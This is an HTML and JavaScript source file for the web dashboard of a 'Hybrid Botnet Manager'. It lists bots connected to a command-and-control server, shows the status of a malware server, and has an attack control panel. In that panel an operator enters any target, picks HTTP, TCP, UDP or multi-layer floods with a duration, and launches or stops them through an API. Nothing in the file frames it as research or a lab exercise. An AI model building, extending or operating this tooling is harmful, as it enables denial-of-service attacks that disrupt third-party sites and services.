<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hybrid Botnet Manager - Dashboard</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        .card {
            border: none;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            backdrop-filter: blur(10px);
            background: rgba(255,255,255,0.9);
        }
        .stat-card {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 20px;
        }
        .bot-status {
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
        }
        .status-active { background: #28a745; color: white; }
        .status-inactive { background: #dc3545; color: white; }
        .attack-running { background: #ffc107; color: black; }
        .attack-stopped { background: #6c757d; color: white; }
        .btn-attack {
            background: linear-gradient(45deg, #ff6b6b, #ee5a24);
            border: none;
            border-radius: 25px;
            padding: 10px 25px;
            color: white;
            font-weight: bold;
        }
        .btn-attack:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }
        .navbar-brand {
            font-weight: bold;
            font-size: 24px;
        }
        .real-time-indicator {
            width: 10px;
            height: 10px;
            background: #28a745;
            border-radius: 50%;
            display: inline-block;
            margin-right: 8px;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <!-- Navigation -->
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container">
            <a class="navbar-brand" href="#">
                <i class="fas fa-robot me-2"></i>
                Hybrid Botnet Manager
            </a>
            <div class="navbar-nav ms-auto">
                <span class="navbar-text">
                    <span class="real-time-indicator"></span>
                    Real-time Updates
                </span>
            </div>
        </div>
    </nav>

    <div class="container mt-4">
        <!-- Statistics Cards -->
        <div class="row mb-4">
            <div class="col-md-3">
                <div class="stat-card text-center">
                    <i class="fas fa-robot fa-2x mb-2"></i>
                    <h3 id="total-bots">0</h3>
                    <p class="mb-0">Total Bots</p>
                </div>
            </div>
            <div class="col-md-3">
                <div class="stat-card text-center">
                    <i class="fas fa-play-circle fa-2x mb-2"></i>
                    <h3 id="active-attacks">0</h3>
                    <p class="mb-0">Active Attacks</p>
                </div>
            </div>
            <div class="col-md-3">
                <div class="stat-card text-center">
                    <i class="fas fa-server fa-2x mb-2"></i>
                    <h3 id="c2-status">Online</h3>
                    <p class="mb-0">C2 Status</p>
                </div>
            </div>
            <div class="col-md-3">
                <div class="stat-card text-center">
                    <i class="fas fa-shield-alt fa-2x mb-2"></i>
                    <h3 id="malware-status">Online</h3>
                    <p class="mb-0">Malware Server</p>
                </div>
            </div>
        </div>

        <!-- Attack Control Panel -->
        <div class="row mb-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header bg-primary text-white">
                        <h5 class="mb-0">
                            <i class="fas fa-crosshairs me-2"></i>
                            Attack Control Panel
                        </h5>
                    </div>
                    <div class="card-body">
                        <form id="attack-form">
                            <div class="row">
                                <div class="col-md-4">
                                    <div class="mb-3">
                                        <label for="target" class="form-label">Target</label>
                                        <input type="text" class="form-control" id="target" 
                                               placeholder="https://target.com or 192.168.1.1:80" required>
                                    </div>
                                </div>
                                <div class="col-md-3">
                                    <div class="mb-3">
                                        <label for="attack-type" class="form-label">Attack Type</label>
                                        <select class="form-select" id="attack-type" required>
                                            <option value="http_flood">HTTP Flood</option>
                                            <option value="tcp_flood">TCP Flood</option>
                                            <option value="udp_flood">UDP Flood</option>
                                            <option value="multi_layer">Multi-Layer</option>
                                        </select>
                                    </div>
                                </div>
                                <div class="col-md-3">
                                    <div class="mb-3">
                                        <label for="duration" class="form-label">Duration (seconds)</label>
                                        <input type="number" class="form-control" id="duration" 
                                               value="300" min="60" max="3600">
                                    </div>
                                </div>
                                <div class="col-md-2">
                                    <div class="mb-3">
                                        <label class="form-label">&nbsp;</label>
                                        <button type="submit" class="btn btn-attack w-100">
                                            <i class="fas fa-rocket me-2"></i>Launch
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <!-- Main Content Tabs -->
        <div class="row">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <ul class="nav nav-tabs card-header-tabs" id="mainTabs" role="tablist">
                            <li class="nav-item" role="presentation">
                                <button class="nav-link active" id="bots-tab" data-bs-toggle="tab" 
                                        data-bs-target="#bots" type="button" role="tab">
                                    <i class="fas fa-robot me-2"></i>Bots
                                </button>
                            </li>
                            <li class="nav-item" role="presentation">
                                <button class="nav-link" id="attacks-tab" data-bs-toggle="tab" 
                                        data-bs-target="#attacks" type="button" role="tab">
                                    <i class="fas fa-crosshairs me-2"></i>Attacks
                                </button>
                            </li>
                            <li class="nav-item" role="presentation">
                                <button class="nav-link" id="logs-tab" data-bs-toggle="tab" 
                                        data-bs-target="#logs" type="button" role="tab">
                                    <i class="fas fa-list-alt me-2"></i>Logs
                                </button>
                            </li>
                        </ul>
                    </div>
                    <div class="card-body">
                        <div class="tab-content" id="mainTabsContent">
                            <!-- Bots Tab -->
                            <div class="tab-pane fade show active" id="bots" role="tabpanel">
                                <div class="d-flex justify-content-between align-items-center mb-3">
                                    <h5>Bot Network</h5>
                                    <button class="btn btn-sm btn-outline-primary" onclick="refreshBots()">
                                        <i class="fas fa-sync-alt me-1"></i>Refresh
                                    </button>
                                </div>
                                <div class="table-responsive">
                                    <table class="table table-hover">
                                        <thead class="table-dark">
                                            <tr>
                                                <th>ID</th>
                                                <th>Socket</th>
                                                <th>Address</th>
                                                <th>Status</th>
                                                <th>Actions</th>
                                            </tr>
                                        </thead>
                                        <tbody id="bots-table-body">
                                            <!-- Bots will be populated here -->
                                        </tbody>
                                    </table>
                                </div>
                            </div>

                            <!-- Attacks Tab -->
                            <div class="tab-pane fade" id="attacks" role="tabpanel">
                                <div class="d-flex justify-content-between align-items-center mb-3">
                                    <h5>Active Attacks</h5>
                                    <button class="btn btn-sm btn-outline-primary" onclick="refreshAttacks()">
                                        <i class="fas fa-sync-alt me-1"></i>Refresh
                                    </button>
                                </div>
                                <div id="attacks-container">
                                    <!-- Attacks will be populated here -->
                                </div>
                            </div>

                            <!-- Logs Tab -->
                            <div class="tab-pane fade" id="logs" role="tabpanel">
                                <div class="d-flex justify-content-between align-items-center mb-3">
                                    <h5>System Logs</h5>
                                    <button class="btn btn-sm btn-outline-secondary" onclick="clearLogs()">
                                        <i class="fas fa-trash me-1"></i>Clear
                                    </button>
                                </div>
                                <div class="bg-dark text-light p-3 rounded" style="height: 400px; overflow-y: auto;">
                                    <pre id="logs-content" class="text-light mb-0"></pre>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Scripts -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <script>
        // Initialize Socket.IO for real-time updates
        const socket = io();
        
        // Global variables
        let botsData = [];
        let attacksData = {};
        
        // Initialize dashboard
        document.addEventListener('DOMContentLoaded', function() {
            refreshBots();
            refreshAttacks();
            startRealTimeUpdates();
            
            // Setup attack form
            document.getElementById('attack-form').addEventListener('submit', function(e) {
                e.preventDefault();
                launchAttack();
            });
        });
        
        // Real-time updates
        function startRealTimeUpdates() {
            // Update stats every 5 seconds
            setInterval(() => {
                updateStats();
            }, 5000);
            
            // Socket events
            socket.on('bot_update', function(data) {
                updateBotData(data);
            });
            
            socket.on('attack_update', function(data) {
                updateAttackData(data);
            });
        }
        
        // Update statistics
        function updateStats() {
            fetch('/api/bots')
                .then(response => response.json())
                .then(data => {
                    if (data.error) return;
                    document.getElementById('total-bots').textContent = data.length;
                });
                
            fetch('/api/attacks')
                .then(response => response.json())
                .then(data => {
                    const activeCount = Object.values(data).filter(attack => attack.status === 'running').length;
                    document.getElementById('active-attacks').textContent = activeCount;
                });
        }
        
        // Refresh bots data
        function refreshBots() {
            fetch('/api/bots')
                .then(response => response.json())
                .then(data => {
                    if (data.error) {
                        document.getElementById('bots-table-body').innerHTML = 
                            '<tr><td colspan="5" class="text-center text-muted">C2 server not running</td></tr>';
                        return;
                    }
                    
                    botsData = data;
                    renderBotsTable();
                })
                .catch(error => {
                    console.error('Error fetching bots:', error);
                    addLog('Error fetching bots: ' + error.message);
                });
        }
        
        // Render bots table
        function renderBotsTable() {
            const tbody = document.getElementById('bots-table-body');
            tbody.innerHTML = '';
            
            botsData.forEach(bot => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${bot.id}</td>
                    <td>${bot.socket_id}</td>
                    <td>${bot.address[0]}:${bot.address[1]}</td>
                    <td><span class="bot-status status-active">Active</span></td>
                    <td>
                        <button class="btn btn-sm btn-outline-danger" onclick="disconnectBot(${bot.id})">
                            <i class="fas fa-times"></i>
                        </button>
                    </td>
                `;
                tbody.appendChild(row);
            });
        }
        
        // Refresh attacks data
        function refreshAttacks() {
            fetch('/api/attacks')
                .then(response => response.json())
                .then(data => {
                    attacksData = data;
                    renderAttacks();
                })
                .catch(error => {
                    console.error('Error fetching attacks:', error);
                    addLog('Error fetching attacks: ' + error.message);
                });
        }
        
        // Render attacks
        function renderAttacks() {
            const container = document.getElementById('attacks-container');
            
            if (Object.keys(attacksData).length === 0) {
                container.innerHTML = '<p class="text-muted text-center">No active attacks</p>';
                return;
            }
            
            let html = '';
            Object.values(attacksData).forEach(attack => {
                const statusClass = attack.status === 'running' ? 'attack-running' : 'attack-stopped';
                const statusText = attack.status === 'running' ? 'Running' : 'Stopped';
                
                html += `
                    <div class="card mb-3">
                        <div class="card-body">
                            <div class="row align-items-center">
                                <div class="col-md-3">
                                    <h6 class="mb-1">${attack.id}</h6>
                                    <small class="text-muted">${attack.type}</small>
                                </div>
                                <div class="col-md-3">
                                    <strong>Target:</strong><br>
                                    <span class="text-primary">${attack.target}</span>
                                </div>
                                <div class="col-md-2">
                                    <strong>Bots:</strong><br>
                                    <span class="badge bg-info">${attack.bots_used}</span>
                                </div>
                                <div class="col-md-2">
                                    <strong>Status:</strong><br>
                                    <span class="bot-status ${statusClass}">${statusText}</span>
                                </div>
                                <div class="col-md-2">
                                    ${attack.status === 'running' ? 
                                        `<button class="btn btn-sm btn-danger" onclick="stopAttack('${attack.id}')">
                                            <i class="fas fa-stop me-1"></i>Stop
                                        </button>` : 
                                        '<span class="text-muted">Completed</span>'
                                    }
                                </div>
                            </div>
                        </div>
                    </div>
                `;
            });
            
            container.innerHTML = html;
        }
        
        // Launch attack
        function launchAttack() {
            const target = document.getElementById('target').value;
            const attackType = document.getElementById('attack-type').value;
            const duration = document.getElementById('duration').value;
            
            if (!target) {
                alert('Please enter a target');
                return;
            }
            
            fetch('/api/start_attack', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    target: target,
                    type: attackType,
                    duration: parseInt(duration)
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    addLog(`Attack launched: ${attackType} on ${target} (ID: ${data.attack_id})`);
                    document.getElementById('target').value = '';
                    refreshAttacks();
                } else {
                    addLog(`Attack failed: ${data.error}`);
                }
            })
            .catch(error => {
                console.error('Error launching attack:', error);
                addLog('Error launching attack: ' + error.message);
            });
        }
        
        // Stop attack
        function stopAttack(attackId) {
            fetch(`/api/stop_attack/${attackId}`)
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        addLog(`Attack stopped: ${attackId}`);
                        refreshAttacks();
                    } else {
                        addLog(`Failed to stop attack: ${data.error}`);
                    }
                })
                .catch(error => {
                    console.error('Error stopping attack:', error);
                    addLog('Error stopping attack: ' + error.message);
                });
        }
        
        // Disconnect bot
        function disconnectBot(botId) {
            if (confirm('Are you sure you want to disconnect this bot?')) {
                addLog(`Bot ${botId} disconnected`);
                refreshBots();
            }
        }
        
        // Add log entry
        function addLog(message) {
            const logsContent = document.getElementById('logs-content');
            const timestamp = new Date().toLocaleTimeString();
            const logEntry = `[${timestamp}] ${message}\n`;
            logsContent.textContent += logEntry;
            logsContent.scrollTop = logsContent.scrollHeight;
        }
        
        // Clear logs
        function clearLogs() {
            if (confirm('Are you sure you want to clear all logs?')) {
                document.getElementById('logs-content').textContent = '';
            }
        }
        
        // Update bot data (Socket.IO)
        function updateBotData(data) {
            // Update specific bot data
            const botIndex = botsData.findIndex(bot => bot.id === data.id);
            if (botIndex !== -1) {
                botsData[botIndex] = { ...botsData[botIndex], ...data };
                renderBotsTable();
            }
        }
        
        // Update attack data (Socket.IO)
        function updateAttackData(data) {
            // Update specific attack data
            if (attacksData[data.id]) {
                attacksData[data.id] = { ...attacksData[data.id], ...data };
                renderAttacks();
            }
        }
    </script>
</body>
</html>
